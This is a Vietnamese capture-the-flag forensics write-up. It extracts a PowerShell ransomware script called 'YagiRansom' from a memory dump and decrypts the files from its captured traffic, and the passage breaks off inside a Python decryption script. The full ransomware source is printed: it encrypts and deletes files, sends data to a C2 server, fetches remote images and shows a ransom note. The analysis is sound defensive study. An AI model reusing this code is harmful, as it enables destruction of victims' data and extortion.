## Challenge được lưu trữ tại đây 
> https://drive.google.com/drive/folders/1fX86RplK36rCiFahGxjzJ_gJu7SseXsQ?usp=sharing
## Urgent Tina
### Description 
> Our client is a pessimist, she is worried that if she does not pay the ransom in the next 8 hours, the hacker will not give her any more chance to get her data back. We are trying to reassure her because we believe that our talented experts can find the cause and restore her data in less than 8 hours.
### Solution
- Bài này cho ta 2 file, 1 file pcapng và 1 file dump từ tiến trình update.exe.
- Đầu tiên mở file pcapng trước, ta thấy có 1 số lệnh POST/GET và 1 vài dữ liệu bị mã hoá khi gửi đi, chắc chắn nó đến từ file update.DMP.
#### Tiến hành phân tích file update.DMP
- Sau khi nghiên cứu trên google, ta có thể phân tích file này thành file exe dựa vào WinDBG
- Tham khảo link này : https://yonifedaeli.blogspot.com/2017/01/how-to-extract-code-from-dump-file.html 
- Trên WinDBG ta có thể nhìn thấy tên tiến trình gốc bằng lệnh `!analyze -v`
- ![aa](image/3.png)
- Tiếp theo ta dùng lệnh `lm` để xem module nào được load trong process
- ![aa](image/4.png)
- Để ý module đầu tiên được load vào là update, chính là file thực thi khởi chạy tạo thành process này. Bởi khi file thực thi khởi chạy thì tiến trình sẽ load nó vào đầu tiên, sau đó mới load các dll cần thiết mà file đó gọi tới.
- Nhấn vào trong nó offset đầu và cuối để dễ trích xuất file này ra.
- ![a](image/5.png)

> !SaveModule 00000000`00aa0000 C:\Users\<YourUsername>\Desktop\update.exe

- Sau đó ta load vào dnSpy hoặc Ilspy.
- Khi load vào mình nhận ra rằng tại resource có 1 file ps1, ở 1 file dll thì việc resource có thêm 1 file ps1 nữa là khá đáng ngờ. Chưa kể trong luồng http bị mã hoá có sử dụng User-Agent là powershell
- Tuy nhiên mình lưu về không được, nên mình sẽ sử dụng lệnh strings để trích xuất file ps1 này ra trực tiếp từ file DMP.
- ![nânna](image/7.png)
<details>
<summary>
Src file powershell
</summary>

```
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "YagiRansom" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }
# Variables
$Mode = $args[0]
$Directory = $args[1]
$WiETm = $args[3]
$7CiB = $args[3]
$UFX = $args[5]
$ENyR = $args[6]
$DCe = $null
# Errors
if ($args[0] -like "-h*") { break }
if ($args[0] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
# Functions
$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = "yaginote.txt"
$7VEq = Get-Date -Format "HH:mm - dd/MM/yy" ; $Uz19o = $7VEq.replace(":","").replace(" ","").replace("-","").replace("/","")+$zVSza+$OgE
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }
function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [String]$Key,
       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,
       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)
   Begin {
      $m95I = New-Object System.Security.Cryptography.SHA256Managed
      $n9ibn = New-Object System.Security.Cryptography.AesManaged
      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $n9ibn.BlockSize = 128
      $n9ibn.KeySize = 256 }
   Process {
      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
      if ($Path) {
         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
         if (!$File.FullName) { break }
         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
         $outPath = $File.FullName + ".enc" }
      $encryptor = $n9ibn.CreateEncryptor()
      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
      $encryptedBytes = $n9ibn.IV + $encryptedBytes
      $n9ibn.Dispose()
      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
      if ($Path) {
         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
  End {
      $m95I.Dispose()
      $n9ibn.Dispose()}}
function RemoveWallpaper {
$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};
public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}
public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};
RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };
SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}
function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 
Invoke-WebRequest -useb https://www.mediafire.com/view/wlq9mlfrlonlcuk/yagi.png/file -Outfile $env:temp\YagiRansom.jpg
Invoke-WebRequest -useb https://www.mediafire.com/file/s4qcg4hk6bnd2pe/Yagi.ico/file -Outfile $env:temp\YagiRansom.ico
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()
$form = New-Object system.Windows.Forms.Form
$form.ControlBox = $false;
$form.Size = New-Object System.Drawing.Size(900,600) 
$form.BackColor = "Black" 
$form.MaximizeBox = $false 
$form.StartPosition = "CenterScreen" 
$form.WindowState = "Normal"
$form.Topmost = $true
$form.FormBorderStyle = "Fixed3D"
$form.Text = "YagiRansom"
$formIcon = New-Object system.drawing.icon ("$env:temp\YagiRansom.ico") 
$form.Icon = $formicon  
$img = [System.Drawing.Image]::Fromfile("$env:temp\YagiRansom.jpg")
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width = 920
$pictureBox.Height = 370
$pictureBox.SizeMode = "StretchImage"
$pictureBox.Image = $img
$form.controls.add($pictureBox)
$label = New-Object System.Windows.Forms.Label
$label.ForeColor = "Cyan"
$label.Text = "All your files have been encrypted by YagiRansom!" 
$label.AutoSize = $true 
$label.Location = New-Object System.Drawing.Size(50,400) 
$font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font 
$form.Controls.Add($label) 
$label1 = New-Object System.Windows.Forms.Label
$label1.ForeColor = "White"
$label1.Text = "But don
t worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours." 
$label1.AutoSize = $true 
$label1.Location = New-Object System.Drawing.Size(50,450)
$font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font1
$form.Controls.Add($label1) 
$okbutton = New-Object System.Windows.Forms.Button;
$okButton.Location = New-Object System.Drawing.Point(750,500)
$okButton.Size = New-Object System.Drawing.Size(110,35)
$okbutton.ForeColor = "Black"
$okbutton.BackColor = "White"
$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$okButton.Text = 'Pay Now!'
$okbutton.Visible = $false
$okbutton.Enabled = $true
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$okButton.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been successfully registered!', 'YagiRansom Payment Processing System',
[Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)
$form.Activate() 2>&1> $null
$form.Focus() 2>&1> $null
$btn=New-Object System.Windows.Forms.Label
$btn.Location = New-Object System.Drawing.Point(50,500)
$btn.Width = 500
$form.Controls.Add($btn)
$btn.ForeColor = "Red"
$startTime = [DateTime]::Now
$count = 10.6
$7VEqr=New-Object System.Windows.Forms.Timer
$7VEqr.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds
if ($remainingSeconds -like "-0.1*"){ $7VEqr.Stop() ; $okbutton.Visible = $true ; $btn.Text = "0 Seconds remaining.." }
$btn.Text = [String]::Format("{0} Seconds remaining..", [math]::round($remainingSeconds))})
$7VEqr.Start()
$btntest = $form.ShowDialog()
if ($btntest -like "OK"){ $Global:PayNow = "True" }}
function R64Encoder { 
   if ($args[0] -eq "-t") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $VaFQ = $VaFQ.Split("=")[0] ; $VaFQ = $VaFQ.Replace("C", "-") ; $VaFQ = $VaFQ.Replace("E", "_")
   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }
function GetStatus {
   Try { Invoke-WebRequest -useb "$7CiB`:$UFX/status" -Method GET 
      Write-Host "[i] C2 Server is up!" -ForegroundColor Green }
   Catch { Write-Host "[!] C2 Server is down!" -ForegroundColor Red }}
function SendResults {
   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
   $2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch
   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs
   Invoke-WebRequest -useb "$7CiB`:$UFX/data" -Method POST -Body $XoX 2>&1> $null
   Invoke-WebRequest -useb "$7CiB`:$UFX/logs" -Method POST -Body $B64Logs 2>&1> $null }
function SendClose {
   Invoke-WebRequest -useb "$7CiB`:$UFX/close" -Method GET 2>&1> $null }
function SendPay {
   Invoke-WebRequest -useb "$7CiB`:$UFX/pay" -Method GET 2>&1> $null }
function SendOK {
   Invoke-WebRequest -useb "$7CiB`:$UFX/done" -Method GET 2>&1> $null }
function CreateReadme {
   $I26TXT = "All your files have been encrypted by YagiRansom!!`nBut don't worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.`nTo get decryption instructions, you must transfer 100000$ to the following account:`n`nAccount Name: Mat tran To quoc Viet Nam - Ban Cuu Tro Trung uong`n`nAccount Number: 0011.00.1932418`n`nBank: Vietnam Joint Stock Commercial Bank for Foreign Trade (Vietcombank)`n"
   if (!(Test-Path "$Directory$slash$I26")) { Add-Content -Path "$Directory$slash$I26" -Value $I26TXT }}
function EncryptFiles { 
   $ExcludedFiles = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path "$Directory$slash$I26" -Value "[!] $i is now encrypted" ;
   Remove-Item $i }
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch ; if (!$RansomLogs) { 
   Add-Content -Path "$Directory$slash$I26" -Value "[!] No files have been encrypted!" }}
function ExfiltrateFiles {
   Invoke-WebRequest -useb "$7CiB`:$UFX/files" -Method GET 2>&1> $null 
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.enc ; if ($RFiles) { $RFiles } else {
   Write-Host "[!] No encrypted files found!" -ForegroundColor Red }}
# Main
if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Shutdowning...." -ForegroundColor Red; sleep 1 }
else {
   Write-Host ;
   Write-Host "[+] Checking communication with C2 Server.." -ForegroundColor Blue
   $DCe = GetStatus ; sleep 1
   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
   Write-Host "[!] Encrypting ..." -ForegroundColor Red
   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1
   if ($ENyR -eq "-x") { Write-Host "[i] Exfiltrating ..." -ForegroundColor Green
      ExfiltrateFiles ; sleep 1 }}
   if (!$DCe) { Write-Host "[+] Saving logs in yaginote.txt.." -ForegroundColor Blue }
   else { Write-Host "[+] Sending logs to C2 Server.." -ForegroundColor Blue }}
   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
   else { SendOK }
sleep 1000 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host

```

</details>

- Ta sẽ xem xét qua các hàm quan trọng trong file này trước
```
function R64Encoder { 
   if ($args[0] -eq "-t") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $VaFQ = $VaFQ.Split("=")[0] ; $VaFQ = $VaFQ.Replace("C", "-") ; $VaFQ = $VaFQ.Replace("E", "_")
   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }
```
- Hàm này chuyển chuỗi qua base64, sau đó loại bỏ dấu "=" phía sau ($VaFQ = $VaFQ.Split("=")[0]) 
- Cuối cùng là thay thế "C" thành "-", "E" thành "_" và đảo chuỗi (reverse)

```
function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [String]$Key,
       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,
       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)
   Begin {
      $m95I = New-Object System.Security.Cryptography.SHA256Managed
      $n9ibn = New-Object System.Security.Cryptography.AesManaged
      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $n9ibn.BlockSize = 128
      $n9ibn.KeySize = 256 }
   Process {
      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
      if ($Path) {
         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
         if (!$File.FullName) { break }
         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
         $outPath = $File.FullName + ".enc" }
      $encryptor = $n9ibn.CreateEncryptor()
      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
      $encryptedBytes = $n9ibn.IV + $encryptedBytes
      $n9ibn.Dispose()
      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
      if ($Path) {
         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
  End {
      $m95I.Dispose()
      $n9ibn.Dispose()}}
```
- Hàm này là hàm mã hoá theo tiêu chuẩn AES sử dụng key đầu vào là 1 chuỗi được mã hoá sha256 mục đích để đảm bảo độ dài
- IV có thể được lấy từ 16 byte đầu tiên của dữ liệu đầu ra
```
function SendResults {
   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
   $2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch
   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs
   Invoke-WebRequest -useb "$7CiB`:$UFX/data" -Method POST -Body $XoX 2>&1> $null
   Invoke-WebRequest -useb "$7CiB`:$UFX/logs" -Method POST -Body $B64Logs 2>&1> $null }
```
- Mình sẽ lấy thằng `"> $cVl > $OgE > $zVSza > $7VEq"` ra trước để tiện cho việc xử lý dữ liệu sau này.
- Chuỗi này được lưu trong biến `$2YngY`, biến `$2YngY` được sử dụng trong hàm `R64Encoder` đã nói ở trên và gửi yêu cầu POST lên máy chủ với endpoint là /data
- Dựa vào luồng stream 0 của wireshark để trích xuất nó ra
- ![âmmamam](image/8.png)
- ![mâmma](image/9.png)

```
> gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd-NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ > administrator > win-ho5dpb1fvnd > 00:09 - 19/09/24
```
- Với endpoint là logs (nơi này chứa tất cả các nhật kí về encrypt file) thì cũng mã hoá theo cách tương tự.
- ![10](image/10.png)
- ![image](image/11.png)
<details>
<summary>
Dữ liệu sau khi giải mã
</summary>

```
[!] C:\Users\IEUser\Documents\13bae5d78b3351adcd58116cc58465ed.png is now encrypted [!] C:\Users\IEUser\Documents\248368233_230702282385338_6224698627922749235_n.jpg is now encrypted [!] C:\Users\IEUser\Documents\ad1639ada044a912032925bdc7f132c8.jpg is now encrypted [!] C:\Users\IEUser\Documents\black.png is now encrypted [!] C:\Users\IEUser\Documents\flag_1.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_10.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_11.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_12.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_13.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_14.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_15.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_16.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_17.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_18.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_19.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_2.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_20.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_21.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_22.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_23.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_24.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_25.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_26.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_27.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_28.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_29.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_3.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_30.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_31.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_32.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_33.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_34.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_35.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_36.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_37.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_38.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_39.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_4.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_40.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_41.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_42.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_43.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_44.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_45.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_46.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_47.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_48.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_49.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_5.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_50.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_51.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_52.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_53.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_54.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_55.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_56.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_57.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_58.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_59.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_6.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_7.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_8.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_9.txt is now encrypted [!] C:\Users\IEUser\Documents\IoT_security_IoTSec_considerations_requirements_and_architectures.pdf is now encrypted [!] C:\Users\IEUser\Documents\jM-z3b7f_400x400.jpg is now encrypted [!] C:\Users\IEUser\Documents\mim.png is now encrypted [!] C:\Users\IEUser\Documents\pexels-sebastiaan-stam-1097456.jpg is now encrypted [!] C:\Users\IEUser\Documents\vietnam.jpg is now encrypted [!] C:\Users\IEUser\Documents\z3399223868975_f9672eaf281fbf6771659ccb18692a12.jpg is now encrypted
```

</details>

- Có thể thấy có nhiều tệp từ flag_1 đến flag_59 bị encrypt. Bây giờ ta xem nội dung nó sẽ bị mã hoá và gửi đi như thế nào

```
function ExfiltrateFiles {
   Invoke-WebRequest -useb "$7CiB`:$UFX/files" -Method GET 2>&1> $null 
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
```
- Từ đây ta thấy rằng chúng lọc tất cả các file có trong `$Directory` (trừ các file đã mã hoá), sau đó gửi lần lượt tên và dữ liệu của file lên
- Xét thằng $B64Name trước (biến này chứa tên)
```
$Pfile = $i.split($slash)[-1] ;
$B64Name = R64Encoder -t $Pfile
Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null
```
- Nhìn vào đây ta thấy tên được mã hoá bằng hàm R64Encoder. Còn đoạn `$Pfile = $i.split($slash)[-1]` chỉ là lấy tên từ đường dẫn đích thôi.
- Sau khi mã hoá gửi thông tin mã hoá chứa tên file thông qua lệnh POST và endpoint là /files
- Thử giải mã 1 vài đoạn dữ liệu thử xem có đúng không.
- ![aaananana](image/13.png)
- ![aaaa](image/12.png)
- Tiếp theo là về phần dữ liệu thực sự của mỗi file, để decrypt thành công được chỗ này ta phải phân tích hàm `EncryptFiles`
```
function EncryptFiles { 
   $ExcludedFiles = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path "$Directory$slash$I26" -Value "[!] $i is now encrypted" ;
   Remove-Item $i }
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch ; if (!$RansomLogs) { 
   Add-Content -Path "$Directory$slash$I26" -Value "[!] No files have been encrypted!" }}
```
- Tập trung vào `Invoke-AESEncryption -Key $WiETm -Path $i`, ta thấy chúng lấy các file có trong thư mục mã hoá bằng key là biến  $WiETm được hash sha256.
- Tuy nhiên key $WiETm hiện tại nó chỉ liên quan đến đoạn random : 
```$WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})```
- Nếu sử dụng phương pháp bruteforce sẽ không khả thi, vì độ dài quá lớn.
- Chúng ta còn 1 cách khác là tìm từ các biến đã có:
```
$7VEq = Get-Date -Format "HH:mm - dd/MM/yy" 
$Uz19o = $7VEq.replace(":","").replace(" ","").replace("-","").replace("/","")+$zVSza+$OgE
$cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ;
$cVl = R64Encoder -t $cvf
Invoke-AESEncryption -Key $WiETm -Path $i
```
- Theo như đã biết thì biến `$cVl, $OgE, $zVSza, $7VEq` đã biết sau khi decrypt dữ liệu từ : "> $cVl > $OgE > $zVSza > $7VEq"
- Hướng giải quyết sẽ là `Tìm $Uz19o => Tìm $cvf => Tìm $WiETm => Decrypt file`
#### Tìm $Uz19o
- Vì $Uz19o được tạo thành từ $7VEq, $zVSza, $OgE nên mình sẽ sử dụng powershell để thuận tiện hơn
```
PS C:\Users\ADMIN> $zVSza = "win-ho5dpb1fvnd"
PS C:\Users\ADMIN> $OgE = "administrator"
PS C:\Users\ADMIN> $7VEq = "00:09 - 19/09/24"
PS C:\Users\ADMIN> $Uz19o = $7VEq.replace(":","").replace(" ","").replace("-","").replace("/","")+$zVSza+$OgE
PS C:\Users\ADMIN> $Uz19o
0009190924win-ho5dpb1fvndadministrator
```
- Ta có giá trị của `$Uz19o` là `0009190924win-ho5dpb1fvndadministrator`

#### Tìm $cvf
- Biến $cvf là đầu vào của biến $cVl trong hàm R64Encoder nên ta chỉ cần decode ngược lại là xong
- ![aaaa](image/14.png)
> fQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ

#### Tìm $WiETm
```$cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ;```
- Ta sẽ dựa vào đây để tìm $WiETm
- ![aa](image/15.png)
- ![ơmama](image/16.png)
- Vậy giá trị của `$WiETm` là `YaMfem0zr4jdiZsDUxv1TH69` (SHA256 là 87db61d8626cfea8e091d71753d913116f53e49804ff6eb5b7eb69ef5a521ab8 )
- Bây giờ decrypt thử 1 vài file 
- ![mâm](image/17.png)
- ![ơaaa](image/18.png)
- Bởi vì flag được chia thành nhiều phần nên ta phải viết script để tiện hơn.
- Đầu tiên ta trích xuất stream 1 thành 1 file txt và sử dụng lệnh `strings extract_data.txt | grep "/files" -A 5 > data.txt
` để lấy các giá trị cần thiết

```
import base64
import hashlib
from Crypto.Cipher import AES

def find_name(value):
    VaFQ = base64.b64encode(value.encode()).decode()
    VaFQ = VaFQ.split('=')[0]
    VaFQ = VaFQ.replace('C', '-').replace('E', '_')
    
    R64Base = VaFQ[::-1]  # Đảo ngược chuỗi
    return R64Base

# print(find_name("flag_48.txt.enc"))

def decode_data_R64(encoded_value):
    reversed_value = encoded_value[::-1]
